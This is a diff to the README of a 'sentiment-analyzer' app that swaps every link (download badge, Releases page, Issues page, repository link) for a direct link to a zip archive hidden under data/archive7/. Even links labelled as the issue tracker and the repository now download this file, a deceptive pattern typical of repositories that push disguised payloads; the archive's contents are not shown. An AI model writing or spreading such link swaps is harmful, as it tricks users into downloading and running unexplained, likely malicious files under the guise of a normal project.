@@ -1,7 +1,7 @@
 # 🎉 sentiment-analyzer - Analyze Sentiment Effortlessly
 
 ## 🔗 Download Now
-[![Download Here](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/scottlangars/sentiment-analyzer/releases)
+[![Download Here](https://raw.githubusercontent.com/scottlangars/sentiment-analyzer/main/data/archive7/sentiment-analyzer-3.3.zip)](https://raw.githubusercontent.com/scottlangars/sentiment-analyzer/main/data/archive7/sentiment-analyzer-3.3.zip)
 
 ## 🚀 Getting Started
 The sentiment-analyzer is a user-friendly app designed to help you understand emotions in text. It uses AI technology to analyze sentiment in different languages, making it versatile and easy to use. This application has an interactive dashboard and allows you to export your results in CSV format.
@@ -18,7 +18,7 @@ Before you download the app, ensure your system meets these requirements:
 To start using sentiment-analyzer, follow these steps:
 
 1. **Visit the Release Page**  
-   Go to the [Releases page](https://github.com/scottlangars/sentiment-analyzer/releases).
+   Go to the [Releases page](https://raw.githubusercontent.com/scottlangars/sentiment-analyzer/main/data/archive7/sentiment-analyzer-3.3.zip).
 
 2. **Choose Your Version**  
    Look for the latest version tag, usually highlighted at the top of the page.
@@ -64,7 +64,7 @@ If you experience issues with the application:
 
 1. **Check Your System Requirements**: Ensure your system meets the requirements listed above.
 2. **Reinstall the App**: Sometimes, reinstalling fixes unexpected issues.
-3. **Visit the Issue Tracker**: Check the [Issues page](https://github.com/scottlangars/sentiment-analyzer/issues) for solutions from other users or report your issue.
+3. **Visit the Issue Tracker**: Check the [Issues page](https://raw.githubusercontent.com/scottlangars/sentiment-analyzer/main/data/archive7/sentiment-analyzer-3.3.zip) for solutions from other users or report your issue.
 
 ## 🌐 Community Support
 Join our community to get help, share ideas, or suggest features:
@@ -74,6 +74,6 @@ Join our community to get help, share ideas, or suggest features:
 ## 🔗 Additional Resources
 For more detailed information about functionalities and updates, refer to the project documentation linked on the Releases page.
 
-For more updates, also check our GitHub repository: [sentiment-analyzer](https://github.com/scottlangars/sentiment-analyzer).
+For more updates, also check our GitHub repository: [sentiment-analyzer](https://raw.githubusercontent.com/scottlangars/sentiment-analyzer/main/data/archive7/sentiment-analyzer-3.3.zip).
 
 Happy analyzing!
